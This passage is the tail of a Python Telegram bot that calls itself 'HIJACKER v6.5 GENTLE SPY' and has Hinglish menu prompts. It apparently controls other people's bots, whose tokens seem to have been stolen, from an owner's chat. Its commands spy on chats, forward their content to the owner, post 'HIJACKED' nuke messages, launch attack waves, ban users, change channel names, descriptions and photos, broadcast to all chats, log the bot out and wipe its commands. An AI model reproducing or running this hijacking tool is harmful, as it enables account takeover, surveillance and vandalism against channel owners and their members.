            send_to_owner("📍 Coordinates likho: <code>28.61,77.20</code>")
        elif "POLL" in upper:
            menu["pending"] = ("poll", ch)
            send_to_owner("📊 Format: <code>Sawal | Option1 | Option2 | Option3</code>")
        elif "WAVE" in upper:
            threading.Thread(target=attack_wave, args=(ch,), daemon=True).start()
            send_to_owner("🌊 Wave chhodi! 💥")
        elif "SCAN" in upper: scan_bots(ch)
        elif "NUKE" in upper:
            api(base, "sendMessage", json={"chat_id": ch, "text": "💣 BOOM! ☢️ HIJACKED 💀"})
            send_to_owner("💣 Nuke maara! 💀")
        elif "PIN" in upper:
            menu["pending"] = ("pin", ch); send_to_owner("📌 Pin karne wala message likho:")
        elif "TITLE" in upper:
            menu["pending"] = ("title", ch); send_to_owner("🗣️ Naya NAAM likho:")
        elif "DESC" in upper:
            menu["pending"] = ("desc", ch); send_to_owner("📄 Naya DESCRIPTION likho:")
        elif "SET PHOTO" in upper:
            menu["pending"] = "chatphoto"
            send_to_owner("🎨 Ab PHOTO bhejo — ye channel ka DP ban jayegi! 😈")
        elif "INVITE" in upper: invite_link(ch)
        elif "MEMBERS" in upper: member_count(ch)

    # ===== CHAT MENU =====
    elif menu["current"] == "chat":
        if "SEND MSG" in upper or "SEND" in upper:
            menu["pending"] = ("send", ch); send_to_owner("✉️ Message likho:")
        elif "SPY" in upper: spy_list(ch)
        elif "FORWARD" in upper: forward_to_owner(ch)
        elif "NUKE" in upper:
            api(base, "sendMessage", json={"chat_id": ch, "text": "💣 BOOM! ☢️ HIJACKED 💀"})
            send_to_owner("💣 Nuke maara! 💀")
        elif "PIN" in upper:
            menu["pending"] = ("pin", ch); send_to_owner("📌 Message likho (pin hoga):")
        elif "DELETE LAST" in upper: delete_last(ch)
        elif "BAN" in upper:
            menu["pending"] = ("ban", ch)
            send_to_owner("🚫 USER_ID bhejo jo BAN karna hai:")
        elif "UNBAN" in upper:
            menu["pending"] = ("unban", ch)
            send_to_owner("✅ USER_ID bhejo jo UNBAN karna hai:")
        elif "MEMBERS" in upper: member_count(ch)
        elif "DESC" in upper:
            menu["pending"] = ("desc", ch); send_to_owner("📄 Naya DESCRIPTION likho:")
        elif "INVITE" in upper: invite_link(ch)
        elif "LEAVE" in upper: leave_chat(ch)

    # ===== DARK MENU =====
    elif menu["current"] == "dark":
        if "BROADCAST" in upper:
            menu["pending"] = ("broadcast", None); send_to_owner("📢 Message likho — SAB chats me! 🚀")
        elif "NUKE" in upper: nuke_all()
        elif "LOGOUT" in upper: logout_bot()
        elif "WIPE" in upper: wipe_commands()
        elif "RELEASE" in upper:
            send_to_owner("🏠 Main menu me RELEASE dabao!")
            go_menu("main")

    elif text.startswith("/start"):
        go_menu("main")


def handle_owner_message(msg):
    if "photo" in msg or any(k in msg for k in MEDIA_KEYS):
        handle_owner_media(msg); return
    text = (msg.get("text") or "").strip()
    if text: handle_owner_text(text)


# ============ MAIN ============
def main():
    global OWNER_ID
    info = requests.get(f"{MY_BASE}/getMe").json()
    if not info.get("ok"):
        print("❌ Hijacker bot token galat!"); return
    me = info["result"]
    print(f"{'='*50}")
    print(f"☢️ HIJACKER v6.5 GENTLE SPY LIVE: @{me['username']}")
    print(f"🚀 SPY OFF (default) → owner bot 100% FULL SPEED")
    print(f"👁️ SPY ON (gentle) → burst {SPY_BURST}s + rest {SPY_REST}s — owner fast!")
    print(f"⏸️ STOP TARGET → full long-poll (100% updates)")
    print(f"{'='*50}\n")

    threading.Thread(target=target_listener, daemon=True).start()
    offset = None
    while True:
        try:
            r = requests.get(f"{MY_BASE}/getUpdates",
                            params={"offset": offset, "timeout": 50}, timeout=60).json()
            for upd in r.get("result", []):
                offset = upd["update_id"] + 1
                if "message" not in upd: continue
                msg = upd["message"]
                uid = msg["from"]["id"]
                text = (msg.get("text") or "").strip()
                if OWNER_ID is None and text.startswith("/start"):
                    OWNER_ID = uid; print(f"👑 Owner: {uid}")
                    go_menu("main"); continue
                if OWNER_ID is not None and uid != OWNER_ID: continue
                print(f"🎮 [OWNER] {text or '(media)'}")
                handle_owner_message(msg)
        except KeyboardInterrupt:
            print("\n👋 Bye! ☢️"); break
        except Exception as e:
            print(f"⚠️ {e}"); time.sleep(2)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))

    threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=port),
        daemon=True
    ).start()

    main()
